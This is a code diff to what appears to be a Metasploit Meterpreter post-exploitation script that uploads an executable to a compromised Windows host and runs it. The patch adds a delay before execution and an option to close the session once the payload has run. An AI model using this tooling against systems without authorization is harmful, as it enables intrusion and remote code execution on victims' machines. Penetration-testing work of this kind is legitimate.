@@ -5,6 +5,8 @@ session = client
   "-e" => [ true, "Executable or script to upload to target host." ],
   "-o" => [ true, "Options for executable." ],
   "-p" => [ false,"Path on target to upload executable, default is %TEMP%." ],
+  "-x" => [ false,"Exit the session once the payload has been run." ],
+  "-s" => [ true,"Sleep for a number of seconds after uploading before executing." ],
   "-v" => [ false,"Verbose, return output of execution of uploaded executable." ],
   "-r" => [ false,"Remove the executable after running it (only works if the executable exits right away)" ]
 )
@@ -21,7 +23,7 @@ def upload(session,file,trgloc = "")
     raise "File to Upload does not exists!"
   else
     if trgloc == ""
-    location = session.fs.file.expand_path("%TEMP%")
+    location = session.sys.config.getenv('TEMP')
     else
       location = trgloc
     end
@@ -93,6 +95,8 @@ helpcall = 0
 path = ""
 verbose = 0
 remove = 0
+quit = 0
+sleep_sec = nil
 @@exec_opts.parse(args) { |opt, idx, val|
   case opt
   when "-e"
@@ -105,8 +109,12 @@ remove = 0
     verbose = 1
   when "-h"
     helpcall = 1
+  when "-s"
+    sleep_sec = val.to_f
   when "-r"
     remove = 1
+  when "-x"
+    quit = 1
   end
 
 }
@@ -116,9 +124,20 @@ if args.length == 0 || helpcall == 1
 end
 print_status("Running Upload and Execute Meterpreter script....")
 exec = upload(session,file,path)
+if sleep_sec
+  print_status("\tSleeping for #{sleep_sec}s...")
+  Rex.sleep(sleep_sec) 
+end
 cmd_on_trgt_exec(session,exec,cmdopt,verbose)
 if remove == 1
   print_status("\tDeleting #{exec}")
   m_unlink(session, exec)
 end
+
+if quit == 1
+  print_status("Closing the session...")
+  session.core.shutdown rescue nil
+  session.shutdown_passive_dispatcher
+end
+
 print_status("Finished!")
